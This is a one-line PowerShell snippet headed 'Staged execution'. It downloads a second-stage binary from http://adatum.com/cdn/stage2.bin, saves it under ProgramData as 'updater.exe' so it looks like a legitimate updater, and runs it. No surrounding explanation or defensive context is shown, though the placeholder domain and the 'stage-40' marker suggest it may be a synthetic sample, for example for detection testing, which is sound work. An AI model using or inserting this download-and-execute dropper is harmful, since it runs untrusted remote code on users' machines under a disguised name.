
<# Staged execution #> $TransferUrl = "http://adatum.com/cdn/stage2.bin"; $Stage2Path = "C:\ProgramData\updater.exe"; (New-Object System.Net.WebClient).DownloadFile($TransferUrl, $Stage2Path); & $Stage2Path; $StageMarker = "stage-40"
